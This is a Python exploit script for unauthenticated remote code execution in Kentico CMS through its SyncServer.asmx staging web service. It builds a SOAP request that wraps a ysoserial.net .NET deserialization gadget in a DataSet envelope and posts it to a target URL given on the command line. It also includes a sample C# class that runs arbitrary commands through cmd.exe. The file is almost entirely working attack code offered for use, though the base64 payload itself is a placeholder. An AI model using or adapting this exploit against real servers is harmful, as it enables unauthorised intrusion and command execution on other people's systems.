#!/usr/bin/env python3

import argparse
import requests
import sys

"""
- Description:
    |_ This exploit is for Kentico 11 and it exploits the SyncServer.asmx by sending a POST request
   with an XML encoded SOAP payload. The payload is generated by using the 'ActivitySurrogateSelectorFromFile' gadget  from ysoserial.net.

 + A simple C# system exec code sample could be used to perform system cmd execution.


- Affected Versions:
    |_ <= 12.0.14

- Reference:
    |_ https://www.aon.com/cyber-solutions/aon_cyber_labs/unauthenticated-remote-code-execution-in-kentico-cms/


"""

"""
Example C#:

using System;
namespace KenticoExploit
{
    class ExploitClass
    {
        public ExploitClass()
        {
            try
            {
                /* Payload code to be executed. */
                System.Diagnostics.Process.Start("cmd.exe", "/C \"<COMMAND>\"");
            }
            catch (Exception)
            {
            }
        }
    }
}
"""


def asciiiii():
    artz = """

 (    ) )  )   (     ( .     (     (     (     (   ((
 )\  (\(  ((.  )\  ( (\  (   )\    )\    )\   ()) (\()
((_)__)(| ))\ ((_) )\(\  )\ ((_)  ((_)) ((_) ((_)))(_)
| |/ /()\((_))| |_(_)( )((_)(/ |  (|_  )| _ \/ __| __|
|   </ -_) ' \)  _| | _| _ \ | |    / / |   / (__| _|
|_|\_\___|_||_|\__|_|__|___/ |_|   /___||_|_\\___|___|

    """
    print(artz)

def exploit(TARGET):
	try:
		payload = "<YSOSERIAL.NET BASE64 PAYLOAD>"

		headers = {"Content-Type": "text/xml; charset=utf-8",
					"SOAPAction": "http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData"}

		data = f'''<?xml version="1.0" encoding="utf-8"?>
				<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	  			   <soap:Body>
	    			<ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer">
	      			<stagingTaskData>
	      			<![CDATA[<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
					<SOAP-ENV:Body>
					<a1:DataSet id="ref-1" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
					<DataSet.RemotingFormat xsi:type="a1:SerializationFormat" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">Binary</DataSet.RemotingFormat>
					<DataSet.DataSetName id="ref-3"></DataSet.DataSetName>
					<DataSet.Namespace href="#ref-3"/>
					<DataSet.Prefix href="#ref-3"/>
					<DataSet.CaseSensitive>false</DataSet.CaseSensitive>
					<DataSet.LocaleLCID>1033</DataSet.LocaleLCID>
					<DataSet.EnforceConstraints>false</DataSet.EnforceConstraints>
					<DataSet.ExtendedProperties xsi:type="xsd:anyType" xsi:null="1"/>
					<DataSet.Tables.Count>1</DataSet.Tables.Count>
					<DataSet.Tables_0 href="#ref-4"/>
					</a1:DataSet>
					<SOAP-ENC:Array id="ref-4" xsi:type="SOAP-ENC:base64">{payload}</SOAP-ENC:Array>
					</SOAP-ENV:Body>
					</SOAP-ENV:Envelope>]]>
					</stagingTaskData>
				   </ProcessSynchronizationTaskData>
				  </soap:Body>
				</soap:Envelope>'''
		#print(data) #Uncomment to view payload

		print(f"[+] Sending exploit to target -> {TARGET}")

		request = requests.post(f"{TARGET}/CMSPages/Staging/SyncServer.asmx", headers=headers, data=data)

		print(f"Status code: -> {request.status_code}")
		print(f"Response body: -> \r\n{request.content}")

	except KeyboardInterrupt:
		print("[-] ERROR -> Interrupt signal captured...")
		sys.exit(1)

#Function to process arguments
def parse_args():

    parser = argparse.ArgumentParser(description='Kentico 11 Arbitrary Code Execution via SyncServer')
    parser.add_argument("-t", "--target",
    					help="Target IP/HOSTNAME\r\nExample: exploit.py -t/--target http/s://contoso.com:[80/443]",
    					type=str)
    args = parser.parse_args(args=None if sys.argv[1:] else ['--help']) #Show help menu if no arguments provided

    if args.target:
    	TARGET = str(args.target)
    	exploit(TARGET)


#Launch program
if __name__ == "__main__":
    try:
        asciiiii()
        parse_args()
    except Exception as e:
        print(f"[-] ERROR -> {e}")
        sys.exit(1)
